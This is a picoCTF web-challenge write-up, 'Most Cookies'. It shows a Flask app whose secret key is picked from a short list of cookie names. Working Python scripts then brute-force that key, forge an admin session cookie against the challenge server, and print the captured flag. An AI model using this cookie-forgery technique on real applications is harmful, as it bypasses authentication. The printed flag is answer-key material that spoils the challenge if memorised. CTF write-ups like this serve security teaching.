# Most Cookies
Category: Web, 150 points

## Description

> Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()


```

## Solution

From the server source code we can see that if we want to get the flag, we need to access the `/display` endpoint with our cookie containing `very_auth=admin`. However, `very_auth` is set by the `/search` endpoint to a cookie name, as long as the name exists in the `cookie_names` whitelist.

Flask session cookies are integrity-protected using a secret key, so we can't just change them. However, we can see that the application's secret key is chosen from a list of known cookie names:

```python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
```

Let's get our hands on a valid session cookie:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Most_Cookies]
└─$ curl 'http://mercury.picoctf.net:18835/search' --data-raw 'name=snickerdoodle' -v -s 2>&1 | grep Set-Cookie
< Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGjJkQ.5t60jNE5kbjq2cv4ieuRUpjyA40; HttpOnly; Path=/
```

We can use [this module](https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe#file-manageflasksession-py) to decode it. We just need to try all cookie names and see which one decodes successfully.

```python
import manageFlaskSession
import requests

from unittest.mock import patch, mock_open
with patch("builtins.open", mock_open(read_data="dummy_flag")):
    import server

res = requests.post("http://mercury.picoctf.net:18835/search", data={"name": "snickerdoodle"})
server_cookie = res.cookies["session"]

print(f"Server cookie: {server_cookie}")

for cookie in server.cookie_names:
    try:
        out = manageFlaskSession.decodeFlaskCookie(cookie, server_cookie)
        print(f"Found correct key: {cookie}, contents = {out}")
        break
    except Exception:
        pass
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Most_Cookies]
└─$ python3 solve.py
Server cookie: eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGjMHg.IOhGVuvfk-x0iqZp-fKP5H7pQWc
Found correct key: butter, contents = {'very_auth': 'snickerdoodle'}
```

Now that we have the key, we can also modify the cookie to contain "admin" and send it back:

```python
import manageFlaskSession
import requests
import re

from unittest.mock import patch, mock_open
with patch("builtins.open", mock_open(read_data="dummy_flag")):
    import server

res = requests.post("http://mercury.picoctf.net:18835/search", data={"name": "snickerdoodle"})
server_cookie = res.cookies["session"]

print(f"Server cookie: {server_cookie}")

for cookie in server.cookie_names:
    try:
        out = manageFlaskSession.decodeFlaskCookie(cookie, server_cookie)
        print(f"Found correct key: {cookie}, contents = {out}")
        new_cookie = manageFlaskSession.encodeFlaskCookie(cookie, {u'very_auth': 'admin'})
        print(f"New cookie: {new_cookie}")
        res = requests.get("http://mercury.picoctf.net:18835/display", cookies={"session": new_cookie})
        if match := re.search(r"picoCTF{[^}]+}", res.text):
            print (f"The flag: {match.group(0)}")
        break
    except Exception:
        pass
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Most_Cookies]
└─$ python3 solve.py
Server cookie: eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YGjPaw.bi82UV-0iMOYsKQycz4FHMQxTIc
Found correct key: butter, contents = {'very_auth': 'snickerdoodle'}
New cookie: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGjPbA.8CsOkSIjd1F5RwYPHwph3OJezN8
The flag: picoCTF{pwn_4ll_th3_cook1E5_743c20eb}
```

The flag: `picoCTF{pwn_4ll_th3_cook1E5_743c20eb}`